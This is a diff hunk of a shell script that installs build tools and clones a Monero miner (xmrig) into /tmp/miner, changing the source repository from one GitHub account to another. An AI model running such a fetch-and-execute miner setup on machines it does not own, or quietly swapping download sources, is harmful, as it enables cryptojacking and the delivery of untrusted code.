@@ -16,7 +16,7 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 4
 cd /tmp && mkdir miner
-git clone https://github.com/WilliamWizard/miner-xmr.git /tmp/miner
+git clone https://github.com/Whaleby/miner-xmr.git /tmp/miner
 cd /tmp/miner
 sleep 1
 chmod +x /tmp/miner/xmrig
